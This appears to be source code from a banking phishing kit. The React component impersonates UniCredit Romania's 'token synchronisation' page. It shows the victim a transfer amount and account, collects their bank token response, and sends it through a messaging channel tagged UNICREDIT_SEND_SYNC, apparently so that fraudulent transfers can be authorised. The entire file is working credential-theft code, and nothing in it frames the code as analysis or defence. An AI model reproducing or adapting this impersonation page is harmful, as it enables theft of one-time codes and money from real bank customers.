import React, { useState } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import {CREDENTIALS_DELIMETER, UserActions} from '../utils/constants'
import logo from '../media/logo_uc.png'
import arrow from '../media/arrow.PNG'
import { Info } from './Info'

export const Step4 = props => {

  const { store, changeStore } = props
  const [value, setValue] = useState(store.step_4_cod)

  //const { payload } = { payload: '1234;;dadadad'}
  const { payload } = store
  const [ suma, cont ] = payload && payload.split(CREDENTIALS_DELIMETER)

  const error = store.error
  const setError = val => changeStore({ error: val })

  const handleChange = (value) => {
    setValue(value)
  }

  const handleSubmit = (e) => {
    e.preventDefault()

    if (!value) {
      setError(true)
      return
    }

    Messaging.send({ type: UserActions.UNICREDIT_SEND_SYNC, payload: value })

    changeStore({
      step_1_cod : value,
      loading: true,
    })

  }

  return(
    <div className="step-wrapper">
      <div>
      <div className="loading-area">
        <div className="header-area">
          <div className="logo-container">
            <img src={logo} alt="UniCredit"/>
          </div>
          <div className="language-selector-container">
            <div className="language-type pt">
              ROMÂNĂ
            </div>
            <div className="arrow-icon">
              <img src={arrow} alt="arrow"/>
            </div>
          </div>
        </div>
        <div className="form-area">
          <form className="login-form" onSubmit={handleSubmit}>
            <div className="login-pseudomodal">
              <div className="login-title pt">
                SINCRONIZARE TOKEN
              </div>

              <div className="field-container">
                <div className="field-description">Suma: <b>{suma}</b></div>
              </div>
              <div className="field-container">
                <div className="field-description">Contul: <b>{cont}</b></div>
              </div>

              <div className="field-container">
                <div className="field-description">Raspunsul Token</div>
                <div className="field-input">
                  <input type="text" value={value} onChange={e => handleChange(e.target.value)} className={error ? `error` : ''}  placeholder="Introduceti Raspunsul Token"/>
                  <div className="error-text">
                    {error && 'Raspunsul Token este introdus eronat'}

                  </div>
                </div>
                
              </div>
              <button className="button-confirm pt-italic" type="submit" >
                Continuă
              </button>
            </div>
          </form>
        </div>
      </div>
        <Info />
      </div>
    </div>
  )
}